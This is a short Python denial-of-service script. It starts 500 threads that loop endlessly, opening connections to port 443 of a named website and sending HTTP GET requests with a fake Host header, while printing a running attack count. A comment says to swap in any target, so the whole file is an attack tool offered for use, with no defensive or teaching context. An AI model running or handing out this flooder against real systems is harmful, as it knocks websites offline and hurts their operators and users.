import socket
import threading

target = 'sultanoverseas.org'  # Replace with the target website
fake_ip = '182.21.20.32'
port = 443
attack_num = 100

def attack():
    global attack_num
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            target_ip = socket.gethostbyname(target)
            s.connect((target_ip, port))
            s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))
            attack_num += 1
            print(attack_num)
        except socket.error:
            pass
        finally:
            s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
